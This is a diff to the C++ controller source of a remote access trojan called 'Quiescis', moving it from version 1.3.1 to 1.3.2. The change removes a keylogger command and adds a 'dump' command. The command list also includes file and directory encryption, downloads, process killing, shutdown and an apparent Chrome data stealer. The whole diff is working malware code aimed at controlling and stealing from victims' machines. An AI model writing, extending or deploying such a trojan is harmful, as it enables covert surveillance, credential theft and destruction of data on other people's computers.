@@ -1,5 +1,5 @@
 /*
- * Quiescis Remote Access Trojan 1.3.1
+ * Quiescis Remote Access Trojan 1.3.2
  * WARNING!
  * This software is the full property of the author
  * Copyright (c) 2020 by Nikait
@@ -50,13 +50,13 @@ enum commands {
 	INFO,
 	PS,
 	KILL,
-	KEYLOGGER,
+	DUMP,
 	CRYPTFILE,
 	CRYPTDIR,
 	DOWNLOAD,
 	SHUTDOWN,
 	ERR,
-	CHROME_ST
+	CHROME_ST,
 };
 
 int main() {
@@ -133,7 +133,7 @@ int main() {
 	if (!conn) throw_error("accept error");
 	else {
 		timenow();
-		std::cout << " Sucessful Connected!\ntype 1 to print HELP [MENU]\n";
+		std::cout << " Sucessful Connected!\ntype help to print HELP [MENU]\n";
 		while (true) {
 			memset(&buffer, 0x0, sizeof(buffer));
 
@@ -226,12 +226,9 @@ int main() {
 				std::cout << buffer << std::endl;
 				break;
 
-			case KEYLOGGER:
-				send(conn, "keylogger", 9, NULL);
-				std::cout << "how many characters should record? => ";
-				std::getline(std::cin, path);
-				send(conn, path.c_str(), sizeof(path), NULL);
-				std::cout << "activate keylogger!\nwait ...\n";
+			case DUMP:
+				send(conn, "dump", 4, NULL);
+
 				recv(conn, buffer, sizeof(buffer), NULL);
 				std::cout << buffer << std::endl;
 				break;
